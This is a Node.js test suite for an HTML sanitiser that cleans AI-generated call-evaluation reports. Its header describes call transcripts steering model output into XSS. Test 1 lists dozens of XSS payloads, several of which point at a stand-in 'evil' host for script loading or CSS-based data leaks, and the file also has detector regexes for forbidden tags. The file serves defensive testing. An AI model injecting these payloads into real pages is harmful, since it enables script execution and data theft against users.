/**
 * sanitizeEvalHtml_ (HtmlSanitizer.gs, copied into index.html and EvalView.html)
 *
 * The old regex sanitiser let `<img src=x onerror=alert(1)>` and
 * `<svg/onload=alert(1)>` through. Model output contains whatever was said on
 * the call, so a transcript can ask for exactly that; the result was run in the
 * analyst's session, stored, and shown to agents and leaders.
 *
 * Checks, in order of importance:
 *   1. a long list of known XSS payloads comes out inert;
 *   2. a seeded fuzz of tag/attribute soup never yields a forbidden tag or an
 *      attribute outside the allow-list;
 *   3. real report markup survives intact (classes, data-* the extractors read,
 *      styles, tables, text with entities);
 *   4. the function is idempotent, and never leaves a tag open;
 *   5. the three copies of the function are byte-identical.
 *
 * Usage: node tests/html-sanitizer-test.js
 */
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { read, extractFunction, makeCheck } = require('./lib/gas-fakes');
const check = makeCheck();

const gsSrc = extractFunction(read('HtmlSanitizer.gs'), 'sanitizeEvalHtml_');
const ctx = vm.createContext({ String, Object, parseInt, RegExp });
vm.runInContext(gsSrc, ctx);
const san = h => ctx.sanitizeEvalHtml_(h);

// What the output may contain, judged by an independent, simple tag scanner.
const FORBIDDEN_TAG = /<\s*\/?\s*(script|style|iframe|object|embed|applet|math|link|meta|base|form|input|textarea|select|template|noscript|img|video|audio|source|frame|foreignobject|animate|set|use|image|text|tspan|desc|a\s+xlink)\b/i;
const OK_ATTR = /^(class|title|colspan|rowspan|align|role|scope|style|href|rel|type|width|height|viewbox|fill|stroke|stroke-width|points|d|cx|cy|r|x|y|x1|y1|x2|y2|data-[a-z0-9-]+|aria-[a-z-]+)$/;
function violations(out) {
  const v = [];
  if (FORBIDDEN_TAG.test(out)) v.push('forbidden tag');
  for (const t of out.matchAll(/<([a-z0-9]+)((?:\s+[^\s=>]+="[^"]*")*)\s*>/g)) {
    for (const a of t[2].matchAll(/\s+([^\s=>]+)="([^"]*)"/g)) {
      if (!OK_ATTR.test(a[1])) v.push('attribute ' + a[1]);
      if (a[1] === 'href' && !/^(https?:|mailto:|tel:|#)/i.test(a[2])) v.push('href ' + a[2]);
      if (a[1] === 'style' && /url\s*\(|expression|javascript:|@import/i.test(a[2])) v.push('style ' + a[2]);
    }
  }
  // every `<` that is not the start of one of our own well-formed tags must be escaped
  const stripped = out.replace(/<\/?[a-z0-9]+(?:\s+[^\s=>]+="[^"]*")*\s*>/g, '');
  if (stripped.indexOf('<') !== -1) v.push('raw < in text: ' + stripped.slice(stripped.indexOf('<'), stripped.indexOf('<') + 30));
  return v;
}

console.log('\nTest 1 — known XSS payloads come out inert');
const PAYLOADS = [
  '<img src=x onerror=alert(1)>',
  '<img src=x onerror="alert(1)">',
  "<img src=x onerror='alert(1)'>",
  '<IMG SRC=x ONERROR=alert(1)>',
  '<svg/onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<script>alert(1)</script>',
  '<script src=//evil/x.js></script>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href="&#x6A;avascript:alert(1)">x</a>',
  '<a href="java&Tab;script:alert(1)">x</a>',
  '<a href="java\nscript:alert(1)">x</a>',
  '<a href="jav&#x09;ascript:alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href=javascript:alert(1)>x</a>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>">',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<input onfocus=alert(1) autofocus>',
  '<body onload=alert(1)>',
  '<div onmouseover="alert(1)">x</div>',
  '<div onmouseover=alert(1)>x</div>',
  '<div/onmouseover=alert(1)>x</div>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="width:expression(alert(1))">x</div>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%">x</div>',
  '<div style="color:red;\\75rl(x)">x</div>',
  '<style>@import "http://evil/x.css";</style>',
  '<style>body{background:url(http://evil/leak)}</style>',
  '<link rel=stylesheet href=http://evil/x.css>',
  '<meta http-equiv="refresh" content="0;url=http://evil">',
  '<base href="http://evil/">',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<template><script>alert(1)</script></template>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<title><img src=x onerror=alert(1)></title>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)> -->',
  '<![CDATA[<img src=x onerror=alert(1)>]]>',
  '<?xml ><img src=x onerror=alert(1)>',
  '<img src=x onerror=alert(1)',
  '<div title="a>b" onclick=alert(1)>x</div>',
  '<div title=\'a"b\' onclick=alert(1)>x</div>',
  '<div title="x"onclick="alert(1)">x</div>',
  '<a href="https://ok.example/" onclick="alert(1)">x</a>',
  '<div data-x="1" onclick="alert(1)" data-y="2">x</div>',
  '<details open ontoggle=alert(1)>x</details>',
  '<div class="x" id="y" name="z" srcdoc="w" formaction="q">x</div>',
  '<<img src=x onerror=alert(1)>',
  '<div><</div>',
  '<a href="https://ok.example/" target="_top">x</a>',
  // SVG is allowed only as plain shapes; every classic SVG vector must be inert
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>',
  '<svg><set attributeName=onmouseover to=alert(1)></set></svg>',
  '<svg><use href="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+"></use></svg>',
  '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>',
  '<svg><style>@import "http://evil/x.css"</style><circle r=1></circle></svg>',
  '<svg><image href=x onerror=alert(1)></image></svg>',
  '<svg><polygon points="1,1" onclick="alert(1)"></polygon></svg>',
  '<svg><circle fill="url(javascript:alert(1))" r=1></circle></svg>',
  '<svg onload=alert(1) width=1 height=1></svg>',
  '<svg><title><img src=x onerror=alert(1)></title></svg>',
  '<svg></p><style><img src=x onerror=alert(1)></style>',
  '<button formaction="javascript:alert(1)" onclick="alert(1)" type="submit">x</button>',
  '<button type=submit>x</button>',
];
let leaked = 0;
for (const p of PAYLOADS) {
  const out = san(p);
  const v = violations(out);
  if (v.length) { leaked++; console.log('  FAIL  ' + JSON.stringify(p) + '\n          -> ' + JSON.stringify(out) + '  [' + v.join('; ') + ']'); }
}
check('all ' + PAYLOADS.length + ' payloads inert', leaked === 0, leaked + ' leaked');
check('the two payloads that beat the old sanitiser are specifically gone',
  !/onerror|onload/i.test(san('<img src=x onerror=alert(1)><svg/onload=alert(1)>')), san('<img src=x onerror=alert(1)><svg/onload=alert(1)>'));
check('javascript: href dropped but the link text survives',
  san('<a href="javascript:alert(1)">click me</a>') === '<a>click me</a>', san('<a href="javascript:alert(1)">click me</a>'));

console.log('\nTest 2 — seeded fuzz never yields a forbidden tag or attribute');
(function fuzz() {
  let seed = 12345;
  const rnd = n => { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed % n; };
  const tags = ['div', 'span', 'a', 'img', 'svg', 'script', 'style', 'iframe', 'p', 'b', 'table', 'td', 'form', 'input', 'details', 'math', 'noscript', 'textarea', 'title', 'br', 'li'];
  const attrs = ['onerror=alert(1)', 'onload="alert(1)"', "onclick='x()'", 'href="javascript:x"', 'href=https://a.b/', 'style="color:red"',
                 'style="background:url(x)"', 'class="c"', 'data-k="v"', 'src=x', 'srcdoc="<b>"', 'id=i', 'title="a>b"', '/', '"', "'", '=', 'ONFOCUS=x'];
  const bits = ['<', '>', '</', '/>', '<!--', '-->', '&lt;', '&#60;', '&amp;', 'text ', '"', "'", '`', '\n', '<![CDATA[', ']]>'];
  let bad = 0, n = 4000;
  for (let i = 0; i < n; i++) {
    let s = '';
    for (let k = 0, len = 3 + rnd(14); k < len; k++) {
      const r = rnd(10);
      if (r < 5) s += '<' + (rnd(5) === 0 ? '/' : '') + tags[rnd(tags.length)] + (rnd(2) ? ' ' + attrs[rnd(attrs.length)] : '') + (rnd(3) ? ' ' + attrs[rnd(attrs.length)] : '') + (rnd(8) ? '>' : '');
      else if (r < 8) s += bits[rnd(bits.length)];
      else s += attrs[rnd(attrs.length)] + ' ';
    }
    const out = san(s);
    const v = violations(out);
    if (v.length) { if (bad++ < 3) console.log('  FAIL  ' + JSON.stringify(s) + '\n          -> ' + JSON.stringify(out) + '  [' + v.join('; ') + ']'); }
  }
  check(n + ' random inputs all clean', bad === 0, bad + ' bad');
})();

console.log('\nTest 3 — real report markup survives');
const REPORT =
  '<div class="report-wrap"><div class="ai-meta" data-sales-attempted="Yes" data-rca-category="Billing &amp; payments" data-call-reason="Bill dispute" data-product-opportunity="None">' +
  '<span class="report-badge-yes" style="cursor:pointer">Yes</span></div>' +
  '<div class="ai-flag"><div class="ai-flag-title">&#9888; Missed Call Back</div><div class="ai-flag-detail">Agent said &quot;I&#39;ll call you back&quot; &amp; did not. 5 &lt; 10</div></div>' +
  '<ul><li>One</li><li>Two <b>bold</b> <em>em</em></li></ul>' +
  '<table><thead><tr><th colspan="2">H</th></tr></thead><tbody><tr><td>a</td><td>b</td></tr></tbody></table>' +
  '<a href="https://example.com/x?a=1&amp;b=2">link</a><br><hr></div>';
const outReport = san(REPORT);
check('class names kept', /class="report-wrap"/.test(outReport) && /class="ai-flag-title"/.test(outReport));
check('data-* the extractors read are kept', /data-rca-category="Billing &amp; payments"/.test(outReport) && /data-call-reason="Bill dispute"/.test(outReport) && /data-sales-attempted="Yes"/.test(outReport), outReport.slice(0, 250));
check('harmless inline style kept', /style="cursor:pointer"/.test(outReport));
check('table structure kept', /<table><thead><tr><th colspan="2">H<\/th><\/tr><\/thead><tbody><tr><td>a<\/td><td>b<\/td><\/tr><\/tbody><\/table>/.test(outReport));
check('list kept', /<ul><li>One<\/li><li>Two <b>bold<\/b> <em>em<\/em><\/li><\/ul>/.test(outReport));
check('entities in text are preserved, not double-escaped', /Agent said &quot;I&#39;ll call you back&quot; &amp; did not\. 5 &lt; 10/.test(outReport), outReport.slice(outReport.indexOf('Agent'), outReport.indexOf('Agent') + 90));
check('https link kept with rel', /<a href="https:\/\/example\.com\/x\?a=1&amp;b=2" rel="noopener noreferrer">link<\/a>/.test(outReport), outReport.slice(-120));
check('void tags kept', /<br><hr>/.test(outReport));
check('plain text with a literal < is escaped, not lost', san('5 < 10 and 3 > 2') === '5 &lt; 10 and 3 > 2', san('5 < 10 and 3 > 2'));
check('null / undefined / empty', san(null) === '' && san(undefined) === '' && san('') === '');
check('non-string input is coerced', san(12345) === '12345');

console.log('\nTest 3b — the Play button on a sample statement survives (and is inert)');
const PLAY =
  '<button class="tts-play-btn" data-tts="Try saying &quot;I can help with that&quot; &amp; confirm" contenteditable="false" title="Play sample statement" ' +
  'style="background:#22c55e;border:none;border-radius:50%;width:20px;height:20px;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;padding:0;vertical-align:middle;margin-right:5px;flex-shrink:0">' +
  '<svg width="9" height="10" viewBox="0 0 9 10" fill="white"><polygon points="1,1 8,5 1,9"/></svg></button>';
const outPlay = san(PLAY);
check('button kept with its class', /<button class="tts-play-btn"/.test(outPlay), outPlay.slice(0, 120));
check('the text to speak (data-tts) is kept and round-trips', /data-tts="Try saying &quot;I can help with that&quot; &amp; confirm"/.test(outPlay), outPlay.slice(0, 200));
check('it always comes out type="button"', /type="button"/.test(outPlay) && !/type="submit"/.test(outPlay), outPlay);
check('the triangle is kept', /<svg width="9" height="10" viewbox="0 0 9 10" fill="white"><polygon points="1,1 8,5 1,9"><\/polygon><\/svg>/.test(outPlay), outPlay.slice(-160));
check('contenteditable is dropped', !/contenteditable/.test(outPlay));
check('the Play button inside a report still reads back the same text',
  /data-tts="Try saying/.test(san('<div class="r-tts-stmt-text">' + PLAY + 'Try saying it</div>')));

console.log('\nTest 4 — idempotent, balanced');
check('sanitising twice changes nothing', san(outReport) === outReport);
for (const p of PAYLOADS.concat([REPORT])) {
  const once = san(p);
  if (san(once) !== once) { check('idempotent for ' + JSON.stringify(p), false, JSON.stringify(once) + ' vs ' + JSON.stringify(san(once))); break; }
}
check('an unclosed tag is closed', san('<div><span>x') === '<div><span>x</span></div>', san('<div><span>x'));
check('a stray closer is dropped', san('x</div></span>y') === 'xy', san('x</div></span>y'));
check('an unterminated <script> drops the rest rather than leaking it', san('safe<script>alert(1)') === 'safe', san('safe<script>alert(1)'));
check('a <style> block drops its CSS text too', san('a<style>p{x:y}</style>b') === 'ab', san('a<style>p{x:y}</style>b'));

console.log('\nTest 5 — the three copies of the function are identical');
const root = path.join(__dirname, '..');
function fnText(file) {
  const s = fs.readFileSync(path.join(root, file), 'utf8').replace(/\r\n/g, '\n');
  const i = s.indexOf('function sanitizeEvalHtml_(');
  if (i === -1) return null;
  return extractFunction(s.slice(i), 'sanitizeEvalHtml_');
}
const base = fnText('HtmlSanitizer.gs').replace(/\r\n/g, '\n');
for (const f of ['index.html', 'EvalView.html']) {
  const t = fnText(f);
  check(f + ' contains sanitizeEvalHtml_', t !== null);
  if (t !== null) check(f + ' copy is identical to HtmlSanitizer.gs', t === base);
}

console.log('\nTest 6 — the report keeps its styling: the server\'s leading <style> survives, nobody else\'s does');
{
  // The server returns sharedCSS() + report. The sanitiser drops every <style>, which
  // once left the report unstyled. The page wrapper must keep the leading block only.
  const css = extractFunction(read('AIService.gs'), 'sharedCSS');
  for (const file of ['index.html', 'EvalView.html']) {
    const wrapSrc = extractFunction(read(file).replace(/\r\n/g, '\n'), 'sanitiseResultHTML');
    const c = vm.createContext({ String, Object, parseInt, RegExp });
    vm.runInContext(gsSrc + '\n' + css + '\n' + wrapSrc, c);
    const wrap = h => c.sanitiseResultHTML(h);
    const REPORT = '<div class="report-wrap"><div class="report-header"><span class="ai-chip">x</span></div></div>';

    const real = wrap(c.sharedCSS() + REPORT);
    check(file + ': the real sharedCSS() block is kept', real.indexOf('<style>') === 0 && /\.report-header\{background:linear-gradient/.test(real), real.slice(0, 80));
    check(file + ': ...kept whole, not cut short', real.indexOf('</style>') > 2000, 'style length ' + real.indexOf('</style>'));
    check(file + ': the report body after it is intact', /<div class="report-wrap"><div class="report-header">/.test(real));
    check(file + ': a second <style> (model or editor) is dropped', wrap(c.sharedCSS() + REPORT + '<style>body{display:none}</style>').split('<style>').length === 2);
    check(file + ': a style that is not first is dropped', wrap(REPORT + c.sharedCSS()).indexOf('<style') === -1);
    check(file + ': a leading style with url() is refused', wrap('<style>a{background:url(http://evil/x)}</style>' + REPORT).indexOf('<style') === -1);
    check(file + ': a leading style with @import is refused', wrap('<style>@import "http://evil/x.css";</style>' + REPORT).indexOf('<style') === -1);
    check(file + ': a leading style that tries to close itself is refused', wrap('<style>a{}</style><img src=x onerror=1><style>b{}</style>' + REPORT).indexOf('onerror') === -1);
    check(file + ': a fixed-position overlay is refused', wrap('<style>.x{position:fixed;inset:0}</style>' + REPORT).indexOf('<style') === -1);
    check(file + ': payloads after the kept style are still sanitised', wrap(c.sharedCSS() + '<img src=x onerror=alert(1)>').indexOf('onerror') === -1);
    check(file + ': empty and null are fine', wrap('') === '' && wrap(null) === '' && wrap(undefined) === '');
  }
}

console.log(check.state.failures ? '\nFAILED' : '\nALL TESTS PASSED');
process.exit(check.state.failures ? 1 : 0);
